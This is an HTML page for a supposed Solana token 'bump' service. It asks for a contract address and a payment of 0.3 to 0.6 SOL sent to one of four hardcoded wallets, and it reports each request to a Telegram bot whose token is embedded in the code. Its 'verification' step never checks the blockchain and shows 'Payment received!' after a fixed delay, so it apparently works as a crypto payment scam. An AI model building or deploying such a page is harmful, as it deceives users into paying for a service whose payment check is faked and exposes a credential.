<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Smart Bumps</title>
  <style>
    :root {
      color-scheme: light dark;
    }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: var(--bg-color, #fff);
      color: var(--text-color, #000);
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    @media (prefers-color-scheme: dark) {
      body {
        --bg-color: #0f0f23;
        --text-color: #fff;
      }
    }
    .container {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(8px);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 500px;
      text-align: center;
    }
    .step {
      display: none;
    }
    .step.active {
      display: block;
    }
    input, select {
      width: 100%;
      padding: 15px;
      font-size: 16px;
      border-radius: 10px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      background: rgba(255, 255, 255, 0.1);
      color: inherit;
      margin-bottom: 20px;
    }
    input:focus, select:focus {
      border-color: #00d4ff;
      outline: none;
    }
    button {
      background: linear-gradient(135deg, #00d4ff, #0091ff);
      border: none;
      color: white;
      padding: 12px 25px;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
    }
    .wallet-box {
      background: rgba(255, 255, 255, 0.05);
      padding: 15px;
      border-radius: 10px;
      font-family: monospace;
      word-break: break-all;
      cursor: pointer;
      margin-top: 15px;
      color: #00d4ff;
    }
    .wallet-box:hover {
      background: rgba(0, 255, 255, 0.1);
    }
    .info {
      font-size: 14px;
      margin-top: 10px;
      opacity: 0.7;
    }
    .loader {
      margin-top: 20px;
      font-size: 15px;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Step 1: Enter Contract Address -->
    <div class="step step-1 active">
      <h2>Step 1: Enter Contract Address</h2>
      <input type="text" id="ca" placeholder="Paste Solana Contract Address" required />
      <button onclick="goToStep(2)">Next</button>
    </div>

    <!-- Step 2: Select Price -->
    <div class="step step-2">
      <h2>Step 2: Select Bump Price</h2>
      <select id="price">
        <option value="0.3">0.3 SOL</option>
        <option value="0.4">0.4 SOL</option>
        <option value="0.5">0.5 SOL</option>
        <option value="0.6">0.6 SOL</option>
      </select>
      <button onclick="goToStep(3)">Next</button>
    </div>

    <!-- Step 3: Payment Info -->
    <div class="step step-3">
      <h2>Step 3: Make Payment</h2>
      <p>Send exactly <strong id="amountDisplay">0.3 SOL</strong> to:</p>
      <div class="wallet-box" id="walletAddressBox" onclick="copyWallet()">Tap to copy</div>
      <p class="info" id="locationTime"></p>
      <button onclick="goToStep(4)">I have paid</button>
    </div>

    <!-- Step 4: Verification -->
    <div class="step step-4">
      <h2>Step 4: Verifying Payment...</h2>
      <div class="loader" id="loader">Checking payment on Solana blockchain...</div>
    </div>
  </div>

  <script>
    const wallets = [
      'AFLmkhJkTe4cxg87cgSpA6EXmG73i6JEvAAJopWfpruZ',
      '6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ',
      '4Zm5ksmdhRLYGGWPkUT5FEAMSYJZ7rgZDvyG6s2mWC2C',
      'DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3'
    ];

    let selectedWallet = '';
    let selectedPrice = '';
    let enteredCA = '';

    function goToStep(step) {
      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
      document.querySelector('.step-' + step).classList.add('active');

      if (step === 2) {
        enteredCA = document.getElementById('ca').value.trim();
        if (!enteredCA) {
          alert("Please enter a valid contract address.");
          goToStep(1);
          return;
        }
      }

      if (step === 3) {
        selectedPrice = document.getElementById('price').value;
        selectedWallet = wallets[Math.floor(Math.random() * wallets.length)];

        document.getElementById('walletAddressBox').textContent = selectedWallet;
        document.getElementById('amountDisplay').textContent = `${selectedPrice} SOL`;

        const date = new Date();
        const time = date.toLocaleTimeString();
        const location = Intl.DateTimeFormat().resolvedOptions().timeZone.replace("_", " ");
        document.getElementById("locationTime").textContent = `📍 ${location} | 🕒 ${time}`;

        // Telegram Alert
        fetch(`https://api.telegram.org/bot8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: '1129109001',
            text: `🆕 NEW BUMP REQUEST\n📄 CA: ${enteredCA}\n💰 Price: ${selectedPrice} SOL\n💼 Wallet: ${selectedWallet}`
          })
        }).catch(console.error);
      }

      if (step === 4) {
        checkPayment();
      }
    }

    function copyWallet() {
      navigator.clipboard.writeText(document.getElementById('walletAddressBox').textContent)
        .then(() => {
          alert('Wallet address copied!');
        });
    }

    function checkPayment() {
      let loader = document.getElementById("loader");
      loader.textContent = "Checking payment on Solana blockchain...";

      setTimeout(() => {
        loader.textContent = "✅ Payment received! Your token will be bumped shortly.";
      }, 7000);
    }
  </script>
</body>
</html>
